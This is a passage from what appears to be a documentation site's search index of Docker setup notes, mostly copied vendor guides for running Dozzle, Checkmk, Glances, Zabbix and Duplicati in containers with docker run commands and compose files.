#Ubuntu</p>"},{"location":"Dockers/removeImages/","title":"removeImages","text":""},{"location":"Dockers/removeImages/#danglin-images-remove","title":"Danglin images remove","text":"<pre><code>docker rmi -f $(docker images -f \"dangling=true\" -q)\ndocker system prune -af\n</code></pre>"},{"location":"Dozzle%28docker%20logs%29/Dozzle/","title":"Getting Started","text":"<p>This section will help you to setup Dozzle locally. Dozzle can also be used to connect to remote hosts via <code>tcp://</code> and tls. See remote host if you want to connect to other hosts.</p>"},{"location":"Dozzle%28docker%20logs%29/Dozzle/#using-docker-cli","title":"Using Docker CLI","text":"<p>The easiest way to setup Dozzle is to use the CLI and mount <code>docker.sock</code> file. This file is usually located at <code>/var/run/docker.sock</code> and can be mounted with the <code>--volume</code> flag. You also need to expose the port to view Dozzle. By default, Dozzle listens on port 8080, but you can change the external port using <code>-p</code>.</p> <p>sh</p> <pre><code>docker run --detach --volume=/var/run/docker.sock:/var/run/docker.sock -p 8080:8080 amir20/dozzle\n</code></pre>"},{"location":"Dozzle%28docker%20logs%29/Dozzle/#using-docker-compose","title":"Using Docker Compose","text":"<p>Docker compose makes it easier to configure Dozzle as part of an existing configuration.</p> <p>yaml</p> <pre><code>version: \"3\"\nservices:\n  dozzle:\n    container_name: dozzle\n    image: amir20/dozzle:latest\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n    ports:\n      - 9999:8080\n</code></pre>"},{"location":"Dozzle%28docker%20logs%29/checkMK/","title":"Installation as a Docker container","text":"<p>Last modified on 17-May-2023Edit this page on GitHub</p> <p>Related Articles</p>"},{"location":"Dozzle%28docker%20logs%29/checkMK/#1-the-basics","title":"1. The basics","text":"<p>There are numerous reasons why many users would want to operate software in a Docker container. Checkmk can also be used in a Docker environment. One application scenario may be to monitor a dynamically-created container group and to make Checkmk a part of this group. Should the container group no longer be needed the Checkmk site can also be removed.</p> <p>Important: Even it is possible and very easy to integrate Checkmk into a containerized infrastructure, it is not always the best solution. Since you get a reduced performance with every virtualization and your monitoring in general should have a minimum of physical dependencies, it is not a good solution to use a Checkmk container to monitor your complete infrastructure. But it may be a good option to integrate a Checkmk container in a self-contained container cluster, because in this case you would be able to monitor this cluster from the inside. So, especially in this case verify whether the Docker/Container tool is the best solution for your actual requirements.</p> <p>In order to make the setting-up as easy as possible for you, we supply each Checkmk edition inclusive of its own specific image, which contains the Linux operating system Ubuntu in addition to Checkmk:</p> Checkmk Raw Edition Docker Hub or Checkmk download page Commercial editions Checkmk download page (for the Cloud Edition), Checkmk customer portal <p>Note: Deployment in Docker Hub allows you to download and install with a single command, as we will show in the chapter on installing the Raw Edition.</p> <p>In this article we will guide you through the installation of Checkmk in Docker, and show a few tricks that will make life with Checkmk in Docker easier. Further information can be found in the article Checkmk server in a Docker container.</p>"},{"location":"Dozzle%28docker%20logs%29/checkMK/#2-prerequisites","title":"2. Prerequisites","text":"<p>To execute the commands presented in this article you will need a working Docker Engine installation and basic knowledge of its use.</p>"},{"location":"Dozzle%28docker%20logs%29/checkMK/#3-installation-of-the-raw-edition","title":"3. Installation of the Raw Edition","text":"<p>Getting started with the  Checkmk Raw Edition in Docker is easy. You can get a suitable image directly from the Docker Hub. This is done with just a single command on the command line. With this command not only will a Docker container with Checkmk be created, but also a monitoring site named <code>cmk</code> is set up and started. This site will be immediately available for a login as the <code>cmkadmin</code> user.</p> <pre><code>root@linux# docker container run -dit -p 8080:5000 -p 8000:8000 --tmpfs /opt/omd/sites/cmk/tmp:uid=1000,gid=1000 -v monitoring:/omd/sites --name monitoring -v /etc/localtime:/etc/localtime:ro --restart always checkmk/check-mk-raw:2.2.0-latest\nUnable to find image 'checkmk/check-mk-raw:2.2.0-latest' locally\n2.2.0-latest: Pulling from checkmk/check-mk-raw\n6552179c3509: Pull complete\n5a25c1702974: Pull complete\n1c5c13e7b7c2: Pull complete\n665c930705aa: Pull complete\n597c556025e7: Pull complete\nfe710cb5a7c0: Pull complete\nDigest: sha256:21be9d9ded25c498834009bcb890ef678fbcdabbc5b31a168f56ab4051b9a813\nStatus: Downloaded newer image for checkmk/check-mk-raw:2.2.0-latest\nb75e2e7d8039e73cc6e57ff09d28b4e6bccc91dbc7a85e55a3062e5fd14f596a\n</code></pre> <p>Some more information on the available options:</p> Option Description <code>-p 8080:5000</code> By default the container\u2019s web server listens on port 5000. In this example port 8080 of the Docker node will be published to the port of the container so that it is accessible from outside. If you do not have another container or process using the standard HTTP port 80, you can also tie the container to it. In such a case the option will look like this: <code>-p 80:5000</code>. The use of HTTPS will be explained in the article Checkmk server in a Docker container. <code>-p 8000:8000</code> Since Checkmk 2.1.0 you also have to publish the port for the Agent Receiver in order to be able to register the agent controller. <code>--tmpfs /opt/omd/sites/cmk/tmp:uid=1000,gid=1000</code> For optimal performance, you can use a temporary file system directly in the RAM of the Docker node. The path for this file system is specified with this option. If you change the site ID this path must also be edited accordingly. <code>-v monitoring:/omd/sites</code> This option binds the data from the site in this container to a persistent location in the Docker node\u2019s file system. The data is not lost if the container is deleted. The code before the colon determines the name\u2009\u2014\u2009in this way you can clearly identify the storage location later, for example, with the <code>docker volume ls</code> command. <code>--name monitoring</code> This defines the name of the container. This name must be unique and may not be used again on the Docker node. <code>-v /etc/localtime:/etc/localtime:ro</code> This option allows you to use the same time zone in the container as that used in the Docker node\u2009\u2014\u2009at the same time the file is integrated as read only (<code>ro</code>). <code>--restart always</code> A container does not normally restart automatically after it has been stopped. With this option you can ensure that it always starts again automatically. However, if you manually stop a container, it will only be restarted if the Docker daemon restarts or the container itself is restarted manually. <code>checkmk/check-mk-raw:2.2.0-latest</code> The Checkmk image label in the <code>&lt;repository&gt;:&lt;tag&gt;</code> format. The exact labels can be read out with the command <code>docker images</code>. <p>After all needed files have been loaded and the container has been started, you should access the Checkmk GUI via <code>http://localhost:8080/cmk/check_mk/</code>:</p> <p></p> <p>You can now for the first time log in and try Checkmk out. You will find the provisional password for the <code>cmkadmin</code> account in the logs that are written for this container (the output is abbreviated to the essential information here in this example):</p> <pre><code>root@linux# docker container logs monitoring\nCreated new site cmk with version 2.2.0p1.cre.\n\n  The site can be started with omd start cmk.\n  The default web UI is available at http://73a86e310b60/cmk/\n\n  The admin user for the web applications is cmkadmin with password: 2JLysBmv\n  For command line administration of the site, log in with 'omd su cmk'.\n  After logging in, you can change the password for cmkadmin with 'cmk-passwd cmkadmin'.\n</code></pre> <p>Note: The URL displayed in the log for accessing the web interface with the ID of the container is only recognized within the container and is not suitable for access from outside in the web browser.</p>"},{"location":"Dozzle%28docker%20logs%29/checkMK/#31-short-lived-containers","title":"3.1. Short-lived containers","text":"<p>If you are sure that the data in the Checkmk container site should only be available in this special container, you can either refrain from assigning a persistent data storage to the container, or you can automatically remove this storage when the container is stopped.</p> <p>To go without persistent storage, simply omit the <code>-v monitoring:/omd/sites</code> option:</p> <pre><code>root@linux# docker container run -dit -p 8080:5000 -p 8000:8000 --tmpfs /opt/omd/sites/cmk/tmp:uid=1000,gid=1000 --name monitoring -v /etc/localtime:/etc/localtime:ro --restart always checkmk/check-mk-raw:2.2.0-latest\n</code></pre> <p>To create a persistent storage and remove it automatically when the container stops, use the following command</p> <pre><code>root@linux# docker container run --rm -dit -p 8080:5000 -p 8000:8000 --tmpfs /opt/omd/sites/cmk/tmp:uid=1000,gid=1000 -v /omd/sites --name monitoring -v /etc/localtime:/etc/localtime:ro checkmk/check-mk-raw:2.2.0-latest\n</code></pre> <p>This command\u2009\u2014\u2009unlike the previous one\u2009\u2014\u2009has only two other options:</p> <ul> <li>Use the <code>--rm</code> option at the start to pass the command that the data storage for the container should also be removed when the container stops. This saves you having to tidy-up manually if you have many short-lived Checkmk containers.</li> </ul> <p>Important: When stopping, the container itself is completely removed!</p> <ul> <li>The <code>-v /omd/sites</code> option is altered compared to the above. It no longer contains a self-assigned name, otherwise the data storage will not be deleted correctly.</li> </ul>"},{"location":"Dozzle%28docker%20logs%29/checkMK/#4-installation-of-the-commercial-editions","title":"4. Installation of the commercial editions","text":"<p>You can also run the commercial editions in a Docker container. The images of the commercial editions are not freely-available through Docker Hub. Download the desired edition and version from the Checkmk download page (for the Cloud Edition) or from the Checkmk customer portal.</p> <p>Load the image from the downloaded tar archive file into Docker:</p> <pre><code>root@linux# docker load -i check-mk-enterprise-docker-2.2.0p1.tar.gz\n9e77dbc9fb80: Loading layer [==================================================&gt;]  2.048kB/2.048kB\n333c8e825260: Loading layer [==================================================&gt;]  305.6MB/305.6MB\n23a76a052da6: Loading layer [==================================================&gt;]  175.7MB/175.7MB\nf8583c4a8a97: Loading layer [==================================================&gt;]  758.4MB/758.4MB\n789d4e45d714: Loading layer [==================================================&gt;]  6.656kB/6.656kB\nLoaded image: checkmk/check-mk-enterprise:2.2.0p1\n</code></pre> <p>You can then start the container with a very similar command to that described above. Just take care that you use the name of the <code>Loaded image</code> from the previous command output in the following start command, so in this example <code>checkmk/check-mk-enterprise:2.2.0p1</code>:</p> <pre><code>root@linux# docker container run -dit -p 8080:5000 -p 8000:8000 --tmpfs /opt/omd/sites/cmk/tmp:uid=1000,gid=1000 -v monitoring:/omd/sites --name monitoring -v /etc/localtime:/etc/localtime:ro --restart always checkmk/check-mk-enterprise:2.2.0p1\nf00d10fcb16313d3539065933b90c4dec9f81745f3d7283d794160f4f9b28df1\n</code></pre> <p>After starting the container, you can log in to the Checkmk web interface as described at the Installation of the Raw Edition.</p>"},{"location":"Dozzle%28docker%20logs%29/checkMK/#5-update","title":"5. Update","text":"<p>How to update Checkmk in a Docker container is described in the Updates and Upgrades article.</p>"},{"location":"Dozzle%28docker%20logs%29/checkMK/#6-uninstallation","title":"6. Uninstallation","text":"<p>When uninstalling, remove the Docker container and optionally the data created when the container was created.</p> <p>Have the Docker containers listed:</p> <pre><code>root@linux# docker container ls -a\nCONTAINER ID   IMAGE                                 COMMAND                  CREATED          STATUS                    PORTS                              NAMES\n9a82ddbabc6e   checkmk/check-mk-enterprise:2.2.0p1   \"/docker-entrypoint.\u2026\"   57 minutes ago   Up 53 minutes (healthy)   6557/tcp, 0.0.0.0:8080-&gt;5000/tcp   monitoring\n</code></pre> <p>Take over the displayed <code>CONTAINER ID</code> from the command output for the next commands.</p> <p>First stop the container and then remove it:</p> <pre><code>root@linux# docker container stop 9a82ddbabc6e\n9a82ddbabc6e\nroot@linux# docker container rm 9a82ddbabc6e\n9a82ddbabc6e\n</code></pre> <p>If you created the container with the <code>-v monitoring:/omd/sites</code> option, you can also remove the Docker volume created by this: <code>docker volume ls</code> displays the volumes and <code>docker volume rm &lt;VOLUME NAME&gt;</code> deletes the volume.</p> <p>Finally, you can remove the image in a similar way: with <code>docker images</code> you get the list of images and <code>docker rmi &lt;IMAGE ID&gt;</code> removes the selected image.</p> <pre><code>version: '3.6'\n\nservices:\n  checkmk:\n    container_name: checkmk\n    image: checkmk/check-mk-raw:1.6.0-latest\n    tmpfs:\n      - /opt/omd/sites/cmk/tmp:uid=1000,gid=1000\n    ulimits:\n      nofile: 1024\n    volumes:\n      - ./monitoring:/omd/sites\n      - /etc/localtime:/etc/localtime:ro\n    ports:\n      - \"8080:5000\"\n    restart: unless-stopped\n    networks:\n      checkmk_network:\n\nnetworks:\n    checkmk_network:\n</code></pre>"},{"location":"Dozzle%28docker%20logs%29/glaces/","title":"Docker","text":"<p>Glances can be installed through Docker, allowing you to run it without installing all the python dependencies directly on your system. Once you have docker installed, you can</p> <p>Get the Glances container:</p> <pre><code>docker pull nicolargo/glances:&lt;version&gt;\n</code></pre> <p>Available tags (all images are based on both Alpine and Ubuntu Operating System):</p> <ul> <li>latest-full for a full Alpine Glances image (latest release) with all dependencies</li> <li>latest for a basic Alpine Glances (latest release) version with minimal dependencies (Bottle and Docker)</li> <li>dev for a basic Alpine Glances image (based on development branch) with all dependencies (Warning: may be instable)</li> <li>ubuntu-latest-full for a full Ubuntu Glances image (latest release) with all dependencies</li> <li>ubuntu-latest for a basic Ubuntu Glances (latest release) version with minimal dependencies (Bottle and Docker)</li> <li>ubuntu-dev for a basic Ubuntu Glances image (based on development branch) with all dependencies (Warning: may be instable)</li> </ul> <p>You can also specify a version (example: 3.4.0). All available versions can be found on DockerHub.</p> <p>An Example to pull the latest tag:</p> <pre><code>docker pull nicolargo/glances:latest\n</code></pre> <p>Run the container in console mode:</p> <pre><code>docker run --rm -v /var/run/docker.sock:/var/run/docker.sock:ro --pid host --network host -it docker.io/nicolargo/glances\n</code></pre> <p>Additionally, if you want to use your own glances.conf file, you can create your own Dockerfile:</p> <pre><code>FROM nicolargo/glances\nCOPY glances.conf /glances/conf/glances.conf\nCMD python -m glances -C /glances/conf/glances.conf $GLANCES_OPT\n</code></pre> <p>Alternatively, you can specify something along the same lines with docker run options:</p> <pre><code>docker run -v `pwd`/glances.conf:/glances/conf/glances.conf -v /var/run/docker.sock:/var/run/docker.sock:ro --pid host -it docker.io/nicolargo/glances\n</code></pre> <p>Where <code>pwd</code>/glances.conf is a local directory containing your glances.conf file.</p> <p>Run the container in Web server mode (notice the GLANCES_OPT environment variable setting parameters for the glances startup command):</p> <pre><code>docker run -d --restart=\"always\" -p 61208-61209:61208-61209 -e GLANCES_OPT=\"-w\" -v /var/run/docker.sock:/var/run/docker.sock:ro --pid host docker.io/nicolargo/glances\n</code></pre> <p>Note: if you want to see the network interface stats within the container, add \u2013net=host \u2013privileged</p> <p>You can also include Glances container in you own docker-compose.yml. Here\u2019s a realistic example including a \u201ctraefik\u201d reverse proxy serving an \u201cwhoami\u201d app container plus a Glances container, providing a simple and efficient monitoring webui.</p> <pre><code>version: '3'\n\nservices:\n  reverse-proxy:\n    image: traefik:alpine\n    command: --api --docker\n    ports:\n      - \"80:80\"\n      - \"8080:8080\"\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n\n  whoami:\n    image: emilevauge/whoami\n    labels:\n      - \"traefik.frontend.rule=Host:whoami.docker.localhost\"\n\n  monitoring:\n    image: nicolargo/glances:latest-alpine\n    restart: always\n    pid: host\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n    environment:\n      - \"GLANCES_OPT=-w\"\n    labels:\n      - \"traefik.port=61208\"\n      - \"traefik.frontend.rule=Host:glances.docker.localhost\"\n</code></pre>"},{"location":"Dozzle%28docker%20logs%29/glaces/#how-to-protect-your-dockerized-server-or-web-server-with-a-loginpassword","title":"How to protect your Dockerized server (or Web server) with a login/password ?","text":"<p>Below are two methods for setting up a login/password to protect Glances running inside a Docker container.</p>"},{"location":"Dozzle%28docker%20logs%29/glaces/#option-1","title":"Option 1","text":"<p>You can enter the running container by entering this command (replacing <code>glances_docker</code> with the name of your container):</p> <pre><code>docker exec -it glances_docker sh\n</code></pre> <p>and generate the password file (the default login is <code>glances</code>, add the <code>--username</code> flag if you would like to change it):</p> <pre><code>glances -s --password\n</code></pre> <p>which will prompt you to answer the following questions:</p> <pre><code>Define the Glances server password (glances username):\nPassword (confirm):\nDo you want to save the password? [Yes/No]: Yes\n</code></pre> <p>after which you will need to kill the process by entering <code>CTRL+C</code> (potentially twice), before leaving the container:</p> <pre><code>exit\n</code></pre> <p>You will then need to copy the password file to your host machine:</p> <pre><code>docker cp glances_docker:/root/.config/glances/glances.pwd ./secrets/glances_password\n</code></pre> <p>and make it visible to your container by adding it to <code>docker-compose.yml</code> as a <code>secret</code>:</p> <pre><code>version: '3'\n\nservices:\n  glances:\n    image: nicolargo/glances:latest\n    restart: always\n    environment:\n      - GLANCES_OPT=\"-w --password\"\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock:ro\n    pid: host\n    secrets:\n      - source: glances_password\n        target: /root/.config/glances/glances.pwd\n\nsecrets:\n  glances_password:\n    file: ./secrets/glances_password\n</code></pre>"},{"location":"Dozzle%28docker%20logs%29/glaces/#option-2","title":"Option 2","text":"<p>You can add a <code>[passwords]</code> block to the Glances configuration file as mentioned elsewhere in the documentation:</p> <pre><code>[passwords]\n# Define the passwords list\n# Syntax: host=password\n# Where: host is the hostname\n#        password is the clear password\n# Additionally (and optionally) a default password could be defined\nlocalhost=mylocalhostpassword\ndefault=mydefaultpassword\n</code></pre>"},{"location":"Dozzle%28docker%20logs%29/glaces/#using-gpu-plugin-with-docker-only-nvidia-gpus","title":"Using GPU Plugin with Docker (Only Nvidia GPUs)","text":"<p>Complete the steps mentioned in the docker docs to make the GPU accessible by the docker engine.</p>"},{"location":"Dozzle%28docker%20logs%29/glaces/#with-docker-run","title":"With docker run","text":"<p>Include the \u2013gpus flag with the docker run command.</p> <p>Note: Make sure the \u2013gpus is present before the image name in the command, otherwise it won\u2019t work.</p> <pre><code>docker run --rm -v /var/run/docker.sock:/var/run/docker.sock:ro --gpus --pid host --network host -it docker.io/nicolargo/glances:latest-full\n</code></pre>"},{"location":"Dozzle%28docker%20logs%29/glaces/#with-docker-compose","title":"With docker-compose","text":"<p>Include the deploy section in compose file as specified below in the example service definition.</p> <pre><code>version: '3'\n\nservices:\n  monitoring:\n    image: nicolargo/glances:latest-full\n    pid: host\n    network_mode: host\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n    environment:\n      - \"GLANCES_OPT=-w\"\n    # For nvidia GPUs\n    deploy:\n      resources:\n        reservations:\n          devices:\n            - driver: nvidia\n              count: 1\n              capabilities: [gpu]\n</code></pre> <p>Reference: https://docs.docker.com/compose/gpu-support/</p>"},{"location":"Dozzle%28docker%20logs%29/zabbix/","title":"Zabbix","text":"<pre><code>version: '3.5'\n\nservices:\n\n  server:\n    image: zabbix/zabbix-server-pgsql:alpine-5.4-latest\n    ports:\n      - \"10051:10051\"\n    volumes:\n      - /etc/localtime:/etc/localtime:ro\n      - /etc/timezone:/etc/timezone:ro\n      - ./zbx_env/usr/lib/zabbix/alertscripts:/usr/lib/zabbix/alertscripts:ro\n      - ./zbx_env/usr/lib/zabbix/externalscripts:/usr/lib/zabbix/externalscripts:ro\n      - ./zbx_env/var/lib/zabbix/export:/var/lib/zabbix/export:rw\n      - ./zbx_env/var/lib/zabbix/modules:/var/lib/zabbix/modules:ro\n      - ./zbx_env/var/lib/zabbix/enc:/var/lib/zabbix/enc:ro\n      - ./zbx_env/var/lib/zabbix/ssh_keys:/var/lib/zabbix/ssh_keys:ro\n      - ./zbx_env/var/lib/zabbix/mibs:/var/lib/zabbix/mibs:ro\n      - ./zbx_env/var/lib/zabbix/snmptraps:/var/lib/zabbix/snmptraps:ro\n    restart: always\n    depends_on:\n      - postgres-server\n    environment:\n      - POSTGRES_USER=zabbix\n      - POSTGRES_PASSWORD=zabbix\n      - POSTGRES_DB=zabbixNew\n      - ZBX_HISTORYSTORAGETYPES=log,text #Zabbix configuration variables\n      - ZBX_DEBUGLEVEL=1\n      - ZBX_HOUSEKEEPINGFREQUENCY=1\n      - ZBX_MAXHOUSEKEEPERDELETE=5000\n      - ZBX_PROXYCONFIGFREQUENCY=3600\n\n  web-nginx-pgsql:\n    image: zabbix/zabbix-web-nginx-pgsql:alpine-5.4-latest\n    ports:\n      - \"8080:8080\"\n      - \"8443:8443\"\n    volumes:\n      - /etc/localtime:/etc/localtime:ro\n      - /etc/timezone:/etc/timezone:ro\n      - ./zbx_env/etc/ssl/nginx:/etc/ssl/nginx:ro\n      - ./zbx_env/usr/share/zabbix/modules/:/usr/share/zabbix/modules/:ro\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:8080/\"]\n      interval: 10s\n      timeout: 5s\n      retries: 3\n      start_period: 30s\n    sysctls:\n      - net.core.somaxconn=65535\n    restart: always\n    depends_on:\n      - server\n      - postgres-server\n    environment:\n      - POSTGRES_USER=zabbix\n      - POSTGRES_PASSWORD=zabbix\n      - POSTGRES_DB=zabbixNew\n      - ZBX_SERVER_HOST=server\n      - ZBX_POSTMAXSIZE=64M\n      - PHP_TZ=Europe/Moscow\n      - ZBX_MAXEXECUTIONTIME=500\n\n  agent:\n    image: zabbix/zabbix-agent:alpine-5.4-latest\n    ports:\n      - \"10050:10050\"\n    volumes:\n      - /etc/localtime:/etc/localtime:ro\n      - /etc/timezone:/etc/timezone:ro\n      - ./zbx_env/etc/zabbix/zabbix_agentd.d:/etc/zabbix/zabbix_agentd.d:ro\n      - ./zbx_env/var/lib/zabbix/modules:/var/lib/zabbix/modules:ro\n      - ./zbx_env/var/lib/zabbix/enc:/var/lib/zabbix/enc:ro\n      - ./zbx_env/var/lib/zabbix/ssh_keys:/var/lib/zabbix/ssh_keys:ro\n    privileged: true\n    pid: \"host\"\n    restart: always\n    depends_on:\n      - server\n    environment:\n      - ZBX_SERVER_HOST=server\n\n  snmptraps:\n    image: zabbix/zabbix-snmptraps:alpine-5.4-latest\n    ports:\n      - \"162:1162/udp\"\n    volumes:\n      - ./snmptraps:/var/lib/zabbix/snmptraps:rw\n    restart: always\n    depends_on:\n      - server\n    environment:\n      - ZBX_SERVER_HOST=server\n\n  postgres-server:\n    image: postgres:13-alpine\n    volumes:\n      - ./zbx_env/var/lib/postgresql/data:/var/lib/postgresql/data:rw\n      - ./.ZBX_DB_CA_FILE:/run/secrets/root-ca.pem:ro\n      - ./.ZBX_DB_CERT_FILE:/run/secrets/server-cert.pem:ro\n      - ./.ZBX_DB_KEY_FILE:/run/secrets/server-key.pem:ro\n    environment:\n      - POSTGRES_PASSWORD=zabbix\n      - POSTGRES_USER=zabbix\n      - POSTGRES_DB=zabbixNew\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n</code></pre>"},{"location":"Duplicatti/compose/","title":"Compose","text":"<pre><code>#Docker compose with superadmin user PID=0 less privileges PID=1000\n# duplicati:v2.0.4.23-2.0.4.23_beta_2019-07-14-ls48 -- S3 AWS working\nversion: \"2.1\"\nservices:\n  duplicati:\n    image: linuxserver/duplicati:v2.0.4.23-2.0.4.23_beta_2019-07-14-ls48\n    container_name: duplicati\n    environment:\n      - PUID=0\n      - PGID=0\n      - TZ=Europe/London\n      - CLI_ARGS= #optional\n    volumes:\n      - ./to/appdata/config:/config\n      - ./to/backups:/backups\n      - /:/source\n    ports:\n      - 8200:8200\n    restart: unless-stopped\n</code></pre>"},{"location":"Duplicatti/duplicattiDocumentation/","title":"duplicattiDocumentation","text":"<p>The LinuxServer.io team brings you another container release featuring:</p> <ul> <li>regular and timely application updates</li> <li>easy user mappings (PGID, PUID)</li> <li>custom base image with s6 overlay</li> <li>weekly base OS updates with common layers across the entire LinuxServer.io ecosystem to minimise space usage, down time and bandwidth</li> <li>regular security updates</li> </ul> <p>Find us at:</p> <ul> <li>Blog - all the things you can do with our containers including How-To guides, opinions and much more!</li> <li>Discord - realtime support / chat with the community and the team.</li> <li>Discourse - post on our community forum.</li> <li>Fleet - an online web interface which displays all of our maintained images.</li> <li>GitHub - view the source for all of our repositories.</li> <li>Open Collective - please consider helping us by either donating or contributing to our budget</li> </ul>"},{"location":"Duplicatti/duplicattiDocumentation/#linuxserverduplicati","title":"linuxserver/duplicati","text":"<p>Duplicati works with standard protocols like FTP, SSH, WebDAV as well as popular services like Microsoft OneDrive, Amazon Cloud Drive &amp; S3, Google Drive, box.com, Mega, hubiC and many others.</p> <p></p>"},{"location":"Duplicatti/duplicattiDocumentation/#supported-architectures","title":"Supported Architectures","text":"<p>We utilise the docker manifest for multi-platform awareness. More information is available from docker here and our announcement here.</p> <p>Simply pulling <code>lscr.io/linuxserver/duplicati:latest</code> should retrieve the correct image for your arch, but you can also pull specific arch images via tags.</p> <p>The architectures supported by this image are:</p> Architecture Available Tag x86-64 \u2705 amd64- arm64 \u2705 arm64v8- armhf \u274c"},{"location":"Duplicatti/duplicattiDocumentation/#version-tags","title":"Version Tags","text":"<p>This image provides various versions that are available via tags. Please read the descriptions carefully and exercise caution when using unstable or development tags.</p> Tag Available Description latest \u2705 Beta releases of Duplicati development \u2705 Canary releases of Duplicati"},{"location":"Duplicatti/duplicattiDocumentation/#application-setup","title":"Application Setup","text":"<p>The webui is at <code>&lt;your ip&gt;:8200</code> , create backup jobs etc via the webui, for local backups select <code>/backups</code> as the destination. For more information see Duplicati.</p>"},{"location":"Duplicatti/duplicattiDocumentation/#usage","title":"Usage","text":"<p>Here are some example snippets to help you get started creating a container.</p>"},{"location":"Duplicatti/duplicattiDocumentation/#docker-compose-recommended-click-here-for-more-info","title":"docker-compose (recommended, click here for more info)","text":"<pre><code>---\nversion: \"2.1\"\nservices:\n  duplicati:\n    image: lscr.io/linuxserver/duplicati:latest\n    container_name: duplicati\n    environment:\n      - PUID=1000\n      - PGID=1000\n      - TZ=Europe/London\n      - CLI_ARGS= #optional\n    volumes:\n      - &lt;/path/to/appdata/config&gt;:/config\n      - &lt;/path/to/backups&gt;:/backups\n      - &lt;/path/to/source&gt;:/source\n    ports:\n      - 8200:8200\n    restart: unless-stopped\n</code></pre>"},{"location":"Duplicatti/duplicattiDocumentation/#docker-cli-click-here-for-more-info","title":"docker cli (click here for more info)","text":"<pre><code>docker run -d \\\n  --name=duplicati \\\n  -e PUID=1000 \\\n  -e PGID=1000 \\\n  -e TZ=Europe/London \\\n  -e CLI_ARGS= `#optional` \\\n  -p 8200:8200 \\\n  -v &lt;/path/to/appdata/config&gt;:/config \\\n  -v &lt;/path/to/backups&gt;:/backups \\\n  -v &lt;/path/to/source&gt;:/source \\\n  --restart unless-stopped \\\n  lscr.io/linuxserver/duplicati:latest\n</code></pre>"},{"location":"Duplicatti/duplicattiDocumentation/#parameters","title":"Parameters","text":"<p>Container images are configured using parameters passed at runtime (such as those above). These parameters are separated by a colon and indicate <code>&lt;external&gt;:&lt;internal&gt;</code> respectively. For example, <code>-p 8080:80</code> would expose port <code>80</code> from inside the container to be accessible from the host's IP on port <code>8080</code> outside the container.</p> Parameter Function <code>-p 8200</code> http gui <code>-e PUID=1000</code> for UserID - see below for explanation <code>-e PGID=1000</code> for GroupID - see below for explanation <code>-e TZ=Europe/London</code> Specify a timezone to use EG Europe/London <code>-e CLI_ARGS=</code> Optionally specify any CLI variables you want to launch the app with <code>-v /config</code> Contains all relevant configuration files. <code>-v /backups</code> Path to store local backups. <code>-v /source</code> Path to source for files to backup."},{"location":"Duplicatti/duplicattiDocumentation/#environment-variables-from-files-docker-secrets","title":"Environment variables from files (Docker secrets)","text":"<p>You can set any environment variable from a file by using a special prepend <code>FILE__</code>.</p> <p>As an example:</p> <pre><code>-e FILE__PASSWORD=/run/secrets/mysecretpassword\n</code></pre> <p>Will set the environment variable <code>PASSWORD</code> based on the contents of the <code>/run/secrets/mysecretpassword</code> file.</p>"},{"location":"Duplicatti/duplicattiDocumentation/#umask-for-running-applications","title":"Umask for running applications","text":"<p>For all of our images we provide the ability to override the default umask settings for services started within the containers using the optional <code>-e UMASK=022</code> setting. Keep in mind umask is not chmod it subtracts from permissions based on it's value it does not add. Please read up here before asking for support.</p>"},{"location":"Duplicatti/duplicattiDocumentation/#user-group-identifiers","title":"User / Group Identifiers","text":"<p>When using volumes (<code>-v</code> flags) permissions issues can arise between the host OS and the container, we avoid this issue by allowing you to specify the user <code>PUID</code> and group <code>PGID</code>.</p> <p>Ensure any volume directories on the host are owned by the same user you specify and any permissions issues will vanish like magic.</p> <p>In this instance <code>PUID=1000</code> and <code>PGID=1000</code>, to find yours use <code>id user</code> as below:</p> <pre><code>  $ id username\n    uid=1000(dockeruser) gid=1000(dockergroup) groups=1000(dockergroup)\n</code></pre>"},{"location":"Duplicatti/duplicattiDocumentation/#docker-mods","title":"Docker Mods","text":"<p>We publish various Docker Mods to enable additional functionality within the containers. The list of Mods available for this image (if any) as well as universal mods that can be applied to any one of our images can be accessed via the dynamic badges above.</p>"},{"location":"Duplicatti/duplicattiDocumentation/#support-info","title":"Support Info","text":"<ul> <li>Shell access whilst the container is running: <code>docker exec -it duplicati /bin/bash</code></li> <li>To monitor the logs of the container in realtime: <code>docker logs -f duplicati</code></li> <li>container version number</li> <li><code>docker inspect -f '{{ index .Config.Labels \"build_version\" }}' duplicati</code></li> <li>image version number</li> <li><code>docker inspect -f '{{ index .Config.Labels \"build_version\" }}' lscr.io/linuxserver/duplicati:latest</code></li> </ul>"},{"location":"Duplicatti/duplicattiDocumentation/#updating-info","title":"Updating Info","text":"<p>Most of our images are static, versioned, and require an image update and container recreation to update the app inside. With some exceptions (ie. nextcloud, plex), we do not recommend or support updating apps inside the container. Please consult the Application Setup section above to see if it is recommended for the image.</p> <p>Below are the instructions for updating containers:</p>"},{"location":"Duplicatti/duplicattiDocumentation/#via-docker-compose","title":"Via Docker Compose","text":"<ul> <li>Update all images:</li> </ul> <p><code>docker-compose pull</code></p> <ul> <li> <p>or update a single image: <code>docker-compose pull duplicati</code></p> </li> <li> <p>Let compose update all containers as necessary:</p> </li> </ul> <p><code>docker-compose up -d</code></p> <ul> <li> <p>or update a single container: <code>docker-compose up -d duplicati</code></p> </li> <li> <p>You can also remove the old dangling images: <code>docker image prune</code></p> </li> </ul>"},{"location":"Duplicatti/duplicattiDocumentation/#via-docker-run","title":"Via Docker Run","text":"<ul> <li>Update the image: <code>docker pull lscr.io/linuxserver/duplicati:latest</code></li> <li>Stop the running container: <code>docker stop duplicati</code></li> <li>Delete the container: <code>docker rm duplicati</code></li> <li>Recreate a new container with the same docker run parameters as instructed above (if mapped correctly to a host folder, your <code>/config</code> folder and settings will be preserved)</li> <li>You can also remove the old dangling images: <code>docker image prune</code></li> </ul>"},{"location":"Duplicatti/duplicattiDocumentation/#via-watchtower-auto-updater-only-use-if-you-dont-remember-the-original-parameters","title":"Via Watchtower auto-updater (only use if you don't remember the original parameters)","text":"<ul> <li>Pull the latest image at its tag and replace it with the same env variables in one run:</li> </ul> <p><code>bash   docker run --rm \\   -v /var/run/docker.sock:/var/run/docker.sock \\   containrrr/watchtower \\   --run-once duplicati</code></p> <ul> <li>You can also 